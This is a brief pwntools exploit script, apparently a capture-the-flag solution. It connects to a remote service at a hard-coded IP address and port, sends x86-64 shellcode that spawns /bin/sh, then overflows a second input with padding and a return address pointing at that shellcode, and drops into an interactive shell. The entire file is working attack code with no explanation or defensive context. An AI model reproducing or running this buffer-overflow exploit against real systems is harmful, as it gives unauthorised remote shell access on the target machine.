from pwn import *

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
name = 0x601080

r = remote('140.110.112.77', 2122)
r.recvuntil('Name:')
r.sendline(shellcode)
r.recvuntil('best')
r.sendline('a' * 0x28 + p64(name))
r.interactive()
